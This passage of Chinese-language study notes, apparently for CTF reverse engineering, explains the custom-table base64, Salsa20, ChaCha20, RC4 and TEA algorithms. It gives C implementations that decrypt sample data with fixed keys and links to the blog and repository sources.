&quot;stuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;;    unsigned char ascill[129] = &#123;0&#125;;    int k = 0;    printf(&quot;table\\n&quot;);    for (int i = 0; i &lt; 64; i++) &#123;        ascill[base64[i]] = k++;    &#125;    for (int i = 0; i &lt; 129; i++) &#123;        printf(&quot;%d,&quot;, ascill[i]);    &#125;    printf(&quot;\\n&quot;);    int decodeStrlen = len / 4 * 3 + 1;    char* decodeStr = (char*)malloc(sizeof(char) * decodeStrlen);    k = 0;    for (int i = 0; i &lt; len; i++) &#123;        unsigned char a, b, c;        a = ascill[str[i]];        b = ascill[str[++i]];        c = (a &lt;&lt; 2) | (b &gt;&gt; 4);        decodeStr[k++] = c;        if (str[i + 1] == &#x27;=&#x27;) &#123;            break;        &#125;        a = ascill[str[i]];        b = ascill[str[++i]];        c = (a &lt;&lt; 4) |( b &gt;&gt; 2);        decodeStr[k++] = c;        if (str[i + 1] == &#x27;=&#x27;) &#123;            break;        &#125;        a = ascill[str[i]];        b = ascill[str[++i]];        c = (a &lt;&lt; 6) | (b);        decodeStr[k++] = c;    &#125;    decodeStr[k] = &#x27;\\0&#x27;;    for (int i = 0; i &lt;= k; i++) &#123;        str[i] = decodeStr[i];    &#125;    free(decodeStr);    return k;&#125;int main() &#123;\tchar input[100] = &#123; &#125;;\tchar dec[100] = &#123; &#125;;&#125;\n\n\nSalsa20需要的数据：8字节的随机数noce，128位或256位的密钥，不定长度明文&#x2F;密文，一个16字节密钥拓展常量”expand 32-byte k”，一个常量[0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]。\n加密流程，密钥拓展-&gt;把拓展的密钥和随机数，计数器，常量排列成一个4x4的矩阵，每个元素4字节-&gt;行列分别多轮加密每行&#x2F;列3个为一组加密-&gt;把矩阵拆分成单字节的盒-&gt;明文与盒异或\n加解密脚本#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &lt;stdio.h&gt;enum s20_status_t  //返回加解密结果状态&#123;    S20_SUCCESS,    S20_FAILURE&#125;;enum s20_keylen_t  //salsa20支持128和256位密钥&#123;    S20_KEYLEN_256,    S20_KEYLEN_128&#125;;static uint32_t rotl(uint32_t value, int shift)   //32位数据位移交换操作&#123;    return (value &lt;&lt; shift) | (value &gt;&gt; (32 - shift));&#125;static void s20_quarterround(uint32_t* y0, uint32_t* y1, uint32_t* y2, uint32_t* y3)  //行列加密逻辑&#123;    *y1 = *y1 ^ rotl(*y0 + *y3, 7);    *y2 = *y2 ^ rotl(*y1 + *y0, 9);    *y3 = *y3 ^ rotl(*y2 + *y1, 13);    *y0 = *y0 ^ rotl(*y3 + *y2, 18);&#125;static void s20_rowround(uint32_t y[16])  //列加密&#123;    s20_quarterround(&amp;y[0], &amp;y[1], &amp;y[2], &amp;y[3]);    s20_quarterround(&amp;y[5], &amp;y[6], &amp;y[7], &amp;y[4]);    s20_quarterround(&amp;y[10], &amp;y[11], &amp;y[8], &amp;y[9]);    s20_quarterround(&amp;y[15], &amp;y[12], &amp;y[13], &amp;y[14]);&#125;static void s20_columnround(uint32_t x[16])    //行加密&#123;    s20_quarterround(&amp;x[0], &amp;x[4], &amp;x[8], &amp;x[12]);    s20_quarterround(&amp;x[5], &amp;x[9], &amp;x[13], &amp;x[1]);    s20_quarterround(&amp;x[10], &amp;x[14], &amp;x[2], &amp;x[6]);    s20_quarterround(&amp;x[15], &amp;x[3], &amp;x[7], &amp;x[11]);&#125;static void s20_doubleround(uint32_t x[16])  //行列加密，这次就是一轮加密&#123;    s20_columnround(x);    s20_rowround(x);&#125;// Creates a little-endian word from 4 bytes pointed to by bstatic uint32_t s20_littleendian(uint8_t* b)  //端序转化，字节数据转小端序4字节&#123;    return b[0] +        ((uint_fast16_t)b[1] &lt;&lt; 8) +        ((uint_fast32_t)b[2] &lt;&lt; 16) +        ((uint_fast32_t)b[3] &lt;&lt; 24);&#125;// Moves the little-endian word into the 4 bytes pointed to by bstatic void s20_rev_littleendian(uint8_t* b, uint32_t w)  //4字节按小端序转字节数据&#123;    b[0] = w;    b[1] = w &gt;&gt; 8;    b[2] = w &gt;&gt; 16;    b[3] = w &gt;&gt; 24;&#125;// The core function of Salsa20static void s20_hash(uint8_t seq[64])&#123;    int i;    uint32_t x[16];    uint32_t z[16];    for (i = 0; i &lt; 16; ++i)        x[i] = z[i] = s20_littleendian(seq + (4 * i)); //转成4字节分组加密    for (i = 0; i &lt; 10; ++i)  //轮加密        s20_doubleround(z);    for (i = 0; i &lt; 16; ++i) &#123;        z[i] += x[i];        s20_rev_littleendian(seq + (4 * i), z[i]);  //转成单字节生成盒    &#125;&#125;// The 16-byte (128-bit) key expansion functionstatic void s20_expand16(uint8_t* k,  //密钥拓展    uint8_t n[16],    uint8_t keystream[64])&#123;    int i, j;    // The constants specified by the Salsa20 specification, &#x27;tau&#x27;    // &quot;expand 16-byte k&quot;    uint8_t t[4][4] = &#123;      &#123; &#x27;e&#x27;, &#x27;x&#x27;, &#x27;p&#x27;, &#x27;a&#x27; &#125;,      &#123; &#x27;n&#x27;, &#x27;d&#x27;, &#x27; &#x27;, &#x27;1&#x27; &#125;,      &#123; &#x27;6&#x27;, &#x27;-&#x27;, &#x27;b&#x27;, &#x27;y&#x27; &#125;,      &#123; &#x27;t&#x27;, &#x27;e&#x27;, &#x27; &#x27;, &#x27;k&#x27; &#125;    &#125;;    // Copy all of &#x27;tau&#x27; into the correct spots in our keystream block    for (i = 0; i &lt; 64; i += 20)        for (j = 0; j &lt; 4; ++j)            keystream[i + j] = t[i / 20][j];    // Copy the key and the nonce into the keystream block    for (i = 0; i &lt; 16; ++i) &#123;        keystream[4 + i] = k[i];        keystream[44 + i] = k[i];        keystream[24 + i] = n[i];    &#125;    s20_hash(keystream);&#125;// The 32-byte (256-bit) key expansion functionstatic void s20_expand32(uint8_t* k,    uint8_t n[16],    uint8_t keystream[64])&#123;    int i, j;    // The constants specified by the Salsa20 specification, &#x27;sigma&#x27;    // &quot;expand 32-byte k&quot;    uint8_t o[4][4] = &#123;      &#123; &#x27;e&#x27;, &#x27;x&#x27;, &#x27;p&#x27;, &#x27;a&#x27; &#125;,      &#123; &#x27;n&#x27;, &#x27;d&#x27;, &#x27; &#x27;, &#x27;3&#x27; &#125;,      &#123; &#x27;2&#x27;, &#x27;-&#x27;, &#x27;b&#x27;, &#x27;y&#x27; &#125;,      &#123; &#x27;t&#x27;, &#x27;e&#x27;, &#x27; &#x27;, &#x27;k&#x27; &#125;    &#125;;    // Copy all of &#x27;sigma&#x27; into the correct spots in our keystream block    for (i = 0; i &lt; 64; i += 20)        for (j = 0; j &lt; 4; ++j)            keystream[i + j] = o[i / 20][j];    // Copy the key and the nonce into the keystream block    for (i = 0; i &lt; 16; ++i) &#123;        keystream[4 + i] = k[i];        keystream[44 + i] = k[i + 16];        keystream[24 + i] = n[i];    &#125;    s20_hash(keystream);&#125;enum s20_status_t s20_crypt(  //加解密函数    uint8_t* key,    //密钥    enum s20_keylen_t keylen,  //密钥长度    uint8_t nonce[8],   //随机数    uint32_t si,   //密钥偏移量，决定从什么时候使用密钥    uint8_t* buf,  //要输入的数据    uint32_t buflen)  //数去的长度&#123;    uint8_t keystream[64];  //密钥流，盒    uint8_t n[16] = &#123; 0 &#125;;  //随机数和计数器    uint32_t i;    void (*expand)(uint8_t*, uint8_t*, uint8_t*) = NULL;    if (keylen == S20_KEYLEN_256)        expand = s20_expand32;    if (keylen == S20_KEYLEN_128)        expand = s20_expand16;          if (expand == NULL || key == NULL || nonce == NULL || buf == NULL)        return S20_FAILURE;    for (i = 0; i &lt; 8; ++i)        n[i] = nonce[i];  //生成随机数与计数器    if (si % 64 != 0) &#123;        s20_rev_littleendian(n + 8, si / 64);        (*expand)(key, n, keystream);     &#125;    for (i = 0; i &lt; buflen; ++i) &#123;        if ((si + i) % 64 == 0) &#123;            s20_rev_littleendian(n + 8, ((si + i) / 64));            (*expand)(key, n, keystream);  //密钥拓展，生成盒        &#125;        buf[i] ^= keystream[(si + i) % 64];  //与原数据异或加密    &#125;    return S20_SUCCESS;&#125;int main() &#123;    uint8_t key[32] = &#123; 0x59, 0x6F, 0x75, 0x74, 0x68, 0x20, 0x53, 0x74,0x72,0x65, 0x6E, 0x67, 0x74, 0x68, 0x65, 0x6E, 0x73,0x20, 0x74, 0x68, 0x65, 0x20, 0x4E, 0x61,0x74, 0x69, 0x6F, 0x6E &#125;;    uint8_t nonce[8] = &#123; 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37 &#125;;    unsigned char data[48] = &#123;    0x5E, 0x13, 0xAA, 0xD3, 0x87, 0x75, 0x2B, 0x7A, 0x1B, 0x16, 0x04, 0xA3, 0x49, 0x7E, 0x1D, 0xD2,    0x6B, 0x5D, 0x58, 0x40, 0x5E, 0x44, 0x63, 0x59, 0x48, 0x51, 0x0D, 0x54, 0x5E, 0x58, 0x55, 0x58,    0xAD, 0x82, 0xAF, 0xDC, 0xE7, 0xAB, 0x58, 0x5D, 0xCE, 0xC1, 0xFD, 0xF7, 0xFF, 0x7F, 0x0, 0x0    &#125;;    printf(&quot;%d&quot;,s20_crypt(key, S20_KEYLEN_256, nonce, 0, (uint8_t*)data, 48));    for (int i = 0; i &lt; 48; i++) &#123;        printf(&quot;%c&quot;, data[i]);    &#125;&#125;\n\n参考ChaCha20加密 与 Salsa20加密 - TLSN - 博客园\n[【动画密码学】Salsa20|流密码_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Bj411q7Kr?spm_id_from=333.788.recommend_more_video.-1&amp;vd_source=7b352c7cd2bdf055df2dc80c7bf5002c)\n\n[alexwebr/salsa20: An implementation of the Salsa20 stream cipher in C99](https://github.com/alexwebr/salsa20)\n\n\nChaCha20需要的数据：一个计数器counter一般为0，8字节的随机数noce，128位或256位的密钥，不定长度明文&#x2F;密文，一个16字节密钥拓展常量”expand 32-byte k”，。\n加密流程，密钥拓展-&gt;把拓展的密钥和随机数，计数器，常量排列成一个4x4的矩阵（顺序排列），每个元素4字节-&gt;列加密，斜对角加密，相比salsa20还多了一次异或-&gt;把矩阵拆分成单字节的盒-&gt;明文与盒异或.\n加解密脚本#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;static inline void u32t8le(uint32_t v, uint8_t p[4]) &#123;    p[0] = v &amp; 0xff;    p[1] = (v &gt;&gt; 8) &amp; 0xff;    p[2] = (v &gt;&gt; 16) &amp; 0xff;    p[3] = (v &gt;&gt; 24) &amp; 0xff;&#125;static inline uint32_t u8t32le(uint8_t p[4]) &#123;    uint32_t value = p[3];    value = (value &lt;&lt; 8) | p[2];    value = (value &lt;&lt; 8) | p[1];    value = (value &lt;&lt; 8) | p[0];    return value;&#125;static inline uint32_t rotl32(uint32_t x, int n) &#123;    // http://blog.regehr.org/archives/1063    return x &lt;&lt; n | (x &gt;&gt; (-n &amp; 31));&#125;// https://tools.ietf.org/html/rfc7539#section-2.1static void chacha20_quarterround(uint32_t* x, int a, int b, int c, int d) &#123;    x[a] += x[b]; x[d] = rotl32(x[d] ^ x[a], 16);    x[c] += x[d]; x[b] = rotl32(x[b] ^ x[c], 12);    x[a] += x[b]; x[d] = rotl32(x[d] ^ x[a], 8);    x[c] += x[d]; x[b] = rotl32(x[b] ^ x[c], 7);&#125;static void chacha20_serialize(uint32_t in[16], uint8_t output[64]) &#123;    int i;    for (i = 0; i &lt; 16; i++) &#123;        u32t8le(in[i], output + (i &lt;&lt; 2));    &#125;&#125;static void chacha20_block(uint32_t in[16], uint8_t out[64], int num_rounds) &#123; // num_rounds 一般为20     int i;    uint32_t x[16];    memcpy(x, in, sizeof(uint32_t) * 16);    for (i = num_rounds; i &gt; 0; i -= 2) &#123;        //odd round        chacha20_quarterround(x, 0, 4, 8, 12);        chacha20_quarterround(x, 1, 5, 9, 13);        chacha20_quarterround(x, 2, 6, 10, 14);        chacha20_quarterround(x, 3, 7, 11, 15);        //even round         chacha20_quarterround(x, 0, 5, 10, 15);        chacha20_quarterround(x, 1, 6, 11, 12);        chacha20_quarterround(x, 2, 7, 8, 13);        chacha20_quarterround(x, 3, 4, 9, 14);    &#125;    for (i = 0; i &lt; 16; i++) &#123;        x[i] += in[i];    &#125;    chacha20_serialize(x, out);&#125;// https://tools.ietf.org/html/rfc7539#section-2.3static void chacha20_init_state(uint32_t s[16], uint8_t key[32], uint32_t counter, uint8_t nonce[12]) &#123;    int i;    // refer: https://dxr.mozilla.org/mozilla-beta/source/security/nss/lib/freebl/chacha20.c    // convert magic number to string: &quot;expand 32-byte k&quot;    s[0] = 0x61707865;    s[1] = 0x3320646e;    s[2] = 0x79622d32;    s[3] = 0x6b206574;    for (i = 0; i &lt; 8; i++) &#123;        s[4 + i] = u8t32le(key + i * 4);    &#125;    s[12] = counter;    for (i = 0; i &lt; 3; i++) &#123;        s[13 + i] = u8t32le(nonce + i * 4);    &#125;&#125;void ChaCha20XOR(uint8_t key[32], uint32_t counter, uint8_t nonce[12], uint8_t* in, uint8_t* out, int inlen) &#123;    int i, j;    uint32_t s[16];    uint8_t block[64];    chacha20_init_state(s, key, counter, nonce);    for (i = 0; i &lt; inlen; i += 64) &#123;        chacha20_block(s, block, 20);        s[12]++;        for (j = i; j &lt; i + 64; j++) &#123;            if (j &gt;= inlen) &#123;                break;            &#125;            out[j] = in[j] ^ block[j - i];        &#125;    &#125;&#125;int main(int argc, char** argv) &#123;    int i;    uint8_t nonce[8] = &#123; 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37 &#125;;    unsigned char data[48] = &#123;    0x5E, 0x13, 0xAA, 0xD3, 0x87, 0x75, 0x2B, 0x7A, 0x1B, 0x16, 0x04, 0xA3, 0x49, 0x7E, 0x1D, 0xD2,    0x6B, 0x5D, 0x58, 0x40, 0x5E, 0x44, 0x63, 0x59, 0x48, 0x51, 0x0D, 0x54, 0x5E, 0x58, 0x55, 0x58,    0xAD, 0x82, 0xAF, 0xDC, 0xE7, 0xAB, 0x58, 0x5D, 0xCE, 0xC1, 0xFD, 0xF7, 0xFF, 0x7F, 0x0, 0x0    &#125;;    uint8_t key[32] = &#123; 0x59, 0x6F, 0x75, 0x74, 0x68, 0x20, 0x53, 0x74, 0x72, 0x65, 0x6E, 0x67, 0x74, 0x68, 0x65, 0x6E,    0x73, 0x20, 0x74, 0x68, 0x65, 0x20, 0x4E, 0x61, 0x74, 0x69, 0x6F, 0x6E ,0x0,0x0,0x0,0x0 &#125;;    uint8_t encrypt[114];    ChaCha20XOR(key, 0, nonce, data, encrypt, 48);         for (int i = 0; i &lt; 48; i++) &#123;        printf(&quot;%c&quot;, encrypt[i]);    &#125;          return 0;&#125;\n\n\n\n#include &lt;assert.h&gt;#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;struct chacha20_context&#123;\tuint32_t keystream32[16];\tsize_t position;\tuint8_t key[32];\tuint8_t nonce[12];\tuint64_t counter;\tuint32_t state[16];&#125;;void chacha20_init_context(struct chacha20_context* ctx, uint8_t key[], uint8_t nounc[], uint64_t counter);void chacha20_xor(struct chacha20_context* ctx, uint8_t* bytes, size_t n_bytes);static uint32_t rotl32(uint32_t x, int n)&#123;\treturn (x &lt;&lt; n) | (x &gt;&gt; (32 - n));&#125;static uint32_t pack4(const uint8_t* a)&#123;\tuint32_t res = 0;\tres |= (uint32_t)a[0] &lt;&lt; 0 * 8;\tres |= (uint32_t)a[1] &lt;&lt; 1 * 8;\tres |= (uint32_t)a[2] &lt;&lt; 2 * 8;\tres |= (uint32_t)a[3] &lt;&lt; 3 * 8;\treturn res;&#125;static void unpack4(uint32_t src, uint8_t* dst) &#123;\tdst[0] = (src &gt;&gt; 0 * 8) &amp; 0xff;\tdst[1] = (src &gt;&gt; 1 * 8) &amp; 0xff;\tdst[2] = (src &gt;&gt; 2 * 8) &amp; 0xff;\tdst[3] = (src &gt;&gt; 3 * 8) &amp; 0xff;&#125;static void chacha20_init_block(struct chacha20_context* ctx, uint8_t key[], uint8_t nonce[])&#123;\tmemcpy(ctx-&gt;key, key, sizeof(ctx-&gt;key));\tmemcpy(ctx-&gt;nonce, nonce, sizeof(ctx-&gt;nonce));\tconst uint8_t* magic_constant = (uint8_t*)&quot;expand 32-byte k&quot;;\tctx-&gt;state[0] = pack4(magic_constant + 0 * 4);\tctx-&gt;state[1] = pack4(magic_constant + 1 * 4);\tctx-&gt;state[2] = pack4(magic_constant + 2 * 4);\tctx-&gt;state[3] = pack4(magic_constant + 3 * 4);\tctx-&gt;state[4] = pack4(key + 0 * 4);\tctx-&gt;state[5] = pack4(key + 1 * 4);\tctx-&gt;state[6] = pack4(key + 2 * 4);\tctx-&gt;state[7] = pack4(key + 3 * 4);\tctx-&gt;state[8] = pack4(key + 4 * 4);\tctx-&gt;state[9] = pack4(key + 5 * 4);\tctx-&gt;state[10] = pack4(key + 6 * 4);\tctx-&gt;state[11] = pack4(key + 7 * 4);\t// 64 bit counter initialized to zero by default.\tctx-&gt;state[12] = 0;\tctx-&gt;state[13] = pack4(nonce + 0 * 4);\tctx-&gt;state[14] = pack4(nonce + 1 * 4);\tctx-&gt;state[15] = pack4(nonce + 2 * 4);\tmemcpy(ctx-&gt;nonce, nonce, sizeof(ctx-&gt;nonce));&#125;static void chacha20_block_set_counter(struct chacha20_context* ctx, uint64_t counter)&#123;\tctx-&gt;state[12] = (uint32_t)counter;\tctx-&gt;state[13] = pack4(ctx-&gt;nonce + 0 * 4) + (uint32_t)(counter &gt;&gt; 32);&#125;static void chacha20_block_next(struct chacha20_context* ctx) &#123;\t// This is where the crazy voodoo magic happens.\t// Mix the bytes a lot and hope that nobody finds out how to undo it.\tfor (int i = 0; i &lt; 16; i++) ctx-&gt;keystream32[i] = ctx-&gt;state[i];#define CHACHA20_QUARTERROUND(x, a, b, c, d) \\    x[a] += x[b]; x[d] = rotl32(x[d] ^ x[a], 16); \\    x[c] += x[d]; x[b] = rotl32(x[b] ^ x[c], 12); \\    x[a] += x[b]; x[d] = rotl32(x[d] ^ x[a], 8); \\    x[c] += x[d]; x[b] = rotl32(x[b] ^ x[c], 7);\tfor (int i = 0; i &lt; 10; i++)\t&#123;\t\tCHACHA20_QUARTERROUND(ctx-&gt;keystream32, 0, 4, 8, 12)\t\t\tCHACHA20_QUARTERROUND(ctx-&gt;keystream32, 1, 5, 9, 13)\t\t\tCHACHA20_QUARTERROUND(ctx-&gt;keystream32, 2, 6, 10, 14)\t\t\tCHACHA20_QUARTERROUND(ctx-&gt;keystream32, 3, 7, 11, 15)\t\t\tCHACHA20_QUARTERROUND(ctx-&gt;keystream32, 0, 5, 10, 15)\t\t\tCHACHA20_QUARTERROUND(ctx-&gt;keystream32, 1, 6, 11, 12)\t\t\tCHACHA20_QUARTERROUND(ctx-&gt;keystream32, 2, 7, 8, 13)\t\t\tCHACHA20_QUARTERROUND(ctx-&gt;keystream32, 3, 4, 9, 14)\t&#125;\tfor (int i = 0; i &lt; 16; i++) ctx-&gt;keystream32[i] += ctx-&gt;state[i];\tuint32_t* counter = ctx-&gt;state + 12;\t// increment counter\tcounter[0]++;\tif (0 == counter[0])\t&#123;\t\t// wrap around occured, increment higher 32 bits of counter\t\tcounter[1]++;\t\t// Limited to 2^64 blocks of 64 bytes each.\t\t// If you want to process more than 1180591620717411303424 bytes\t\t// you have other problems.\t\t// We could keep counting with counter[2] and counter[3] (nonce),\t\t// but then we risk reusing the nonce which is very bad.\t\tassert(0 != counter[1]);\t&#125;&#125;void chacha20_init_context(struct chacha20_context* ctx, uint8_t key[], uint8_t nonce[], uint64_t counter)&#123;\tmemset(ctx, 0, sizeof(struct chacha20_context));\tchacha20_init_block(ctx, key, nonce);\tchacha20_block_set_counter(ctx, counter);\tctx-&gt;counter = counter;\tctx-&gt;position = 64;&#125;void chacha20_xor(struct chacha20_context* ctx, uint8_t* bytes, size_t n_bytes)&#123;\tuint8_t* keystream8 = (uint8_t*)ctx-&gt;keystream32;\tfor (size_t i = 0; i &lt; n_bytes; i++)\t&#123;\t\tif (ctx-&gt;position &gt;= 64)\t\t&#123;\t\t\tchacha20_block_next(ctx);\t\t\tfor (int i = 0; i &lt; 64; i++) &#123;\t\t\t\tprintf(&quot;%.2x,&quot;, keystream8[i]);\t\t\t&#125;\t\t\tctx-&gt;position = 0;\t\t&#125;\t\tbytes[i] ^= keystream8[ctx-&gt;position];\t\tctx-&gt;position++;\t&#125;&#125;int main() &#123;       uint8_t nonce[8] = &#123; 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37 &#125;;    unsigned char data[48] = &#123;    0x5E, 0x13, 0xAA, 0xD3, 0x87, 0x75, 0x2B, 0x7A, 0x1B, 0x16, 0x04, 0xA3, 0x49, 0x7E, 0x1D, 0xD2,    0x6B, 0x5D, 0x58, 0x40, 0x5E, 0x44, 0x63, 0x59, 0x48, 0x51, 0x0D, 0x54, 0x5E, 0x58, 0x55, 0x58,    0xAD, 0x82, 0xAF, 0xDC, 0xE7, 0xAB, 0x58, 0x5D, 0xCE, 0xC1, 0xFD, 0xF7, 0xFF, 0x7F, 0x0, 0x0    &#125;;\tuint8_t key[32] = &#123; 0x59, 0x6F, 0x75, 0x74, 0x68, 0x20, 0x53, 0x74, 0x72, 0x65, 0x6E, 0x67, 0x74, 0x68, 0x65, 0x6E,\t0x73, 0x20, 0x74, 0x68, 0x65, 0x20, 0x4E, 0x61, 0x74, 0x69, 0x6F, 0x6E ,0x0,0x0,0x0,0x0&#125;;\t\tstruct chacha20_context ctx;\tchacha20_init_context(&amp;ctx, key, nonce, 0);\tchacha20_xor(&amp;ctx,(uint8_t*) data,48);\tprintf(&quot;\\n&quot;);    for (int i = 0; i &lt; 48; i++) &#123;        printf(&quot;%.2x,&quot;, data[i]);    &#125;&#125;\n\nGinurx&#x2F;chacha20-c: ChaCha20 stream cipher implemented in C\nChaCha20加密 与 Salsa20加密 - TLSN - 博客园\n\nRC4 https://blog.csdn.net/xiao__1bai/article/details/123357156\n演示动画\n对称加密算法，可以用写内存解决。\n单字节加密。\n大概流程：初始化盒S，用密钥初始化盒子T，用S和T的值做为索引组合交换盒S中的内容打乱S盒，遍历要加密的数据，再次用S盒中的数据作为下标和S盒内的数据进行交换打乱，把S盒中的数据相加作为索引在S盒中寻找数据与原数据进行异或。\n代码解读\n来自上面的链接\n#include&lt;stdio.h&gt; /*程序实现时，需要注意的是，状态向量数组S和临时向量数组T的类型应设为unsigned char，而不是char。因为在一些机器下，将char默认做为signed char看待，在算法中计算下标i，j的时候，会涉及char转int，如果是signed的char，那么将char的8位拷贝到int的低8位后，还会根据char的符号为，在int的高位补0或1。由于密钥是随机产生的，如果遇到密钥的某个字节的高位为1的话，那么计算得到的数组下标为负数，就会越界。*/typedef struct _RC4INFO&#123;\tunsigned char s_box[256];\tunsigned char t_box[256];&#125;RC4_INFO,*PRC4_INFO;\t\t\t//定义 RC4 中要用到的 S-Box 和临时向量 T，封装在结构体中并给正常别名和指针别名。   /*初始化函数 需要传入key 以及 keylen主要有几个步骤1.初始化Sbox2.将key填充到Tbox中3.组合sbox[i] 与 tbox[i] 然后进行交换*/void rc4_init(PRC4_INFO prc4,unsigned char key[],unsigned int keylen)&#123;\tint i=0;\tint j=0;\tunsigned char tmp;\tif(prc4==NULL)\t&#123;\t\treturn;\t&#125;\t\t/*\t初始化存储0-255字节的Sbox(其实就是一个数组)\t填充key到256个字节数组中称为Tbox(你输入的key不满256个字节则初始化到256个字节)\t*/ \tfor(i=0;i&lt;256;i++)\t&#123;\t\tprc4-&gt;s_box[i] = i;\t\tprc4-&gt;t_box[i] = key[i % keylen];\t//如果密钥的长度是256字节，就直接把密钥的值赋给k，否则，轮转地将密钥的每个字节赋给k \t&#125;\t\t//交换s[i]与s[j]   i 从0开始一直到255下标结束. j是 s[i]与T[i]组合得出的下标\tfor(i=0;i&lt;256;i++)\t&#123;\t\tj=(j+prc4-&gt;s_box[i]+prc4-&gt;t_box[i])%256;\t\t//开始交换\t\ttmp=prc4-&gt;s_box[i];\t\tprc4-&gt;s_box[i]=prc4-&gt;s_box[j];\t\tprc4-&gt;s_box[j]=tmp;\t&#125; &#125;  /*RC4加密其实就是遍历数据,将数据与sbox进行异或加密,而在此之前还需要交换一次sbox的数据交换完之后 再把s[i] + s[j]的组合当做下标再去异或. */void rc4_crypt(unsigned char data[],unsigned int datalen,unsigned char key[],unsigned int keylen)\t//参数分别是要加密的数据、要加密的数据长度、加密数据所用的Key、加密数据所用的key长度&#123;\tint dn=0;\t//data[n]的意思\tint i=0;\tint j=0;\t//i j分别用于交换sbox[i] 和 sbox[j]\tint t=0;\t//t = s[i] +s[j]\tunsigned char tmp;\t\tRC4_INFO rc4;\t\t//这里定义前面的结构题 \trc4_init(&amp;rc4,key,keylen);\t\t//在加密函数中调用初始化函数，就省去了其它代码中出现的要保存初始化 sBox 的现象了.\t\tfor(dn=0;dn&lt;datalen;dn++)\t&#123;\t\t//i确保S-box的每个元素都得到处理，j保证S-box的搅乱是随机的。\t\ti=(i+1)%256;\t\tj=(j+rc4.s_box[i])%256;\t\t\t\t//交换 s_box[i] 和 s_box[j]\t\ttmp=rc4.s_box[i];\t\trc4.s_box[i] = rc4.s_box[j];\t\trc4.s_box[j] = tmp;\t\t\t\t//交换完之后 再把s[i] + s[j]的组合当做下标再去异或.\t\tt = (rc4.s_box[i] + rc4.s_box[j]) % 256;\t\tdata[dn] ^= rc4.s_box[t];\t &#125; &#125; void EntryBuffer(unsigned char data[],unsigned int datalen)&#123;\tunsigned char key[]=&quot;pjrHeldsadf&quot;;\trc4_crypt(data,datalen,key,sizeof(key)/sizeof(key[0]));&#125; int main()&#123;\tchar Hell[] = &quot;黄河远上白云间&quot;;    printf(&quot;加密前：pData=%s\\n\\n&quot;, Hell);    EntryBuffer((unsigned char*)Hell,sizeof(Hell)/sizeof(Hell[0])); //加第一次调用就是加密     printf(&quot;加密后：pData=%s\\n\\n&quot;, Hell);    EntryBuffer((unsigned char*)Hell,sizeof(Hell)/sizeof(Hell[0])); //由于异或运算的对合性，RC4加密解密使用同一套算法。    printf(&quot;解密后：pData=%s\\n\\n&quot;, Hell);    return 0;&#125;\n\n一般形式（特征）#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt;#include&lt;string.h&gt;//s 表的长度取 256#define size 256unsigned char sbox[257] = &#123; 0 &#125;;// 初始化 s 表void init_sbox(unsigned char* key) &#123;\tunsigned int i, j, k;\tint tmp;\tfor (i = 0; i &lt; size; i++) &#123;\t\tsbox[i] = i;\t&#125;\tj =k = 0;\tfor (i = 0; i &lt; size; i++) &#123;\t\ttmp = sbox[i];\t\tj = (j + tmp + key[i % strlen((char*)key)]) % size;  //注意此处的长度，自己计算一下密钥和数据的长度多次尝试        //这里就不创建T盒了，直接对密钥进行遍历\t\tsbox[i] = sbox[j];\t\tsbox[j] = tmp;\t\t/*if (++k &gt;= 12)\t\t\tk = 0;*/\t&#125;&#125;// 加解密函数void enc_dec(unsigned char* key, unsigned char* data) &#123;\tint i, j, k, R, tmp;\tinit_sbox(key);\tj = k = 0;\tfor (i = 0; i &lt; strlen((char*)data); i++) &#123;\t\tj = (j + 1) % size;\t\tk = (k + sbox[j]) % size;\t\ttmp = sbox[j];\t\tsbox[j] = sbox[k];\t\tsbox[k] = tmp;\t\tR = sbox[(sbox[j] + sbox[k]) % size];\t\tdata[i] ^= R;\t&#125;&#125;int main() &#123;\tunsigned char key[100] = &#123; 0x52, 0x69, 0x63, 0x61, 0x72, 0x64, 0x6F, 0x5F, 0x4D, 0x5F, 0x6C &#125;;//, 0x75 &#125;;\tunsigned char data[100] = &#123; 0xC2, 0xB0, 0x0E, 0xBE, 0xDB, 0xDF, 0x95, 0x2D, 0xCF, 0x4B, 0x74, 0x41, 0xF3, 0xC9, 0x43, 0xA7,\t0x3C, 0x70, 0xC2, 0x2F, 0xFF, 0x8D, 0x65, 0x2C, 0x5C &#125;;\tprintf(&quot;key:%d,data:%d&quot;, strlen((char*)key), strlen((char*)data));  //查看一下key的长度是否异常,如果有异常请手动输入\tprintf(&quot;\\n&quot;);\t/*printf(&quot;输入你要加密的字符：&quot;);\tscanf(&quot;%100s&quot;, data);\tprintf(&quot;输入密钥：&quot;);\tscanf(&quot;%40s&quot;, key);\tenc_dec(key, data);\tprintf(&quot;enc: %s\\n&quot;, data);*/\tenc_dec(key, data);\tprintf(&quot;dec: %s\\n&quot;, data);\treturn 0;&#125;\n\n\nTEA https://blog.csdn.net/xiao__1bai/article/details/123307059\n动画演示\n位移与运算的关系\nA &gt;&gt; n == A / pow(2,n)A &lt;&lt; n == A * pow(2,n)\n\n加密流程：需要两个4字节的明文和四个4字节的密钥，以及一个delta值（通常为黄金分割数(5√-2)&#x2F;2 与 232 的乘积0x9e3779b9即2654435769），把明文分组进行多轮与相加加密。且为分组加密，组与组间相互影响。\n代码分析（来自上面文章）\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; void encrypt (uint32_t *v,uint32_t *k )&#123;\tuint32_t v0=v[0],v1=v[1],sum=0,i;\tuint32_t delta=0x9e3779b9;  //2654435769\tuint32_t k0=k[0],k1=k[1],k2=k[2],k3=k[3];\tfor(i=0;i&lt;32;i++)&#123;\t\tsum+=delta;\t\tv0+=((v1 &lt;&lt; 4) + k0)^(v1 + sum)^((v1 &gt;&gt; 5) + k1);\t\tv1+=((v0 &lt;&lt; 4) + k2)^(v0 + sum)^((v0 &gt;&gt; 5) + k3);\t&#125; \tv[0]=v0;v[1]=v1;&#125;void decrypt (uint32_t *v,uint32_t *k)&#123;\tuint32_t 